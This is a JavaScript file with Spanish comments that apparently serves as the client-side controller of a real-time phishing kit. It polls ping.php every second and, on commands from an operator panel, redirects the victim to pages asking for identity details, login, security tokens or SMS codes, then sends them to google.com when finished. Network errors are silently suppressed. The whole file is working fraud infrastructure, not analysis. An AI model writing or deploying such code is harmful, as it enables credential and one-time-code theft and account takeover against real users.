document.addEventListener('DOMContentLoaded', () => {
    // 1. Validación de seguridad: Si no existe la variable global visitorId, no hacemos nada.
    if (typeof visitorId === 'undefined' || !visitorId) {
        console.error('Error crítico: visitorId no está definido.');
        return;
    }

    // 2. Función de sondeo (Polling) al servidor
    const checkStatus = async () => {
        try {
            // Llamada a ping.php enviando el ID y un timestamp para evitar caché
            const response = await fetch(`ping.php?id=${encodeURIComponent(visitorId)}&t=${Date.now()}`);
            
            if (!response.ok) return; // Si hay error de red, ignorar y reintentar en el siguiente ciclo

            const data = await response.json();
            const action = (data.action || '').trim();

            // 3. Redirecciones según la orden del panel de administración
            if (action === 'blocked') {
                window.location.href = 'index.php'; // O la página de bloqueo
            } else if (action === 'pedir_identidad') {
                window.location.href = 'identificacion.php';
            } else if (action === 'pedir_token' || action === 'pedir_sms') {
                window.location.href = 'seguridad.php';
            } else if (action === 'finished') {
                window.location.href = 'https://www.google.com';
            } else if (action === 'pedir_login') {
                window.location.href = 'index.php';
            }
        } catch (error) {
            // Silenciamos errores de red para que no ensucien la consola
        }
    };

    // 4. Ejecutar el sondeo cada 1000 milisegundos (1 segundo)
    setInterval(checkStatus, 1000);
    
    // Ejecutar una vez inmediatamente al cargar para no esperar el primer segundo
    checkStatus();
});
